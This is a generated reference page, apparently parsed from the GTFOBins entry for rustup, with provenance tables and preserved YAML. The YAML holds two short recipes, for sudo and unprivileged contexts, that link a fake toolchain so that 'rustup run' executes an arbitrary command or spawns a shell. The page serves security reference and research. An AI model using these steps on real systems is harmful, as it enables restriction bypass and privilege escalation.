---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rustup

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rustup` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rustup` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [rustup](../../tools/linux/rustup.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rustup |
| name | rustup |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/rustup/ |

## Preserved Source Material

```yaml
_body: ''
_name: rustup
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rustup
functions:
  command:
  - code: 'mkdir /path/to/temp-dir/bin/

      mkdir /path/to/temp-dir/lib/

      echo ''/path/to/command'' >/path/to/temp-dir/bin/rustc

      chmod +x /path/to/temp-dir/bin/rustc

      rustup toolchain link x /path/to/temp-dir/

      rustup run x rustc'
    contexts:
      sudo: null
      unprivileged: null
  shell:
  - code: 'mkdir /path/to/temp-dir/bin/

      mkdir /path/to/temp-dir/lib/

      cp /bin/sh /path/to/temp-dir/bin/rustc

      rustup toolchain link x /path/to/temp-dir/

      rustup run x rustc'
    contexts:
      sudo: null
      unprivileged: null
```
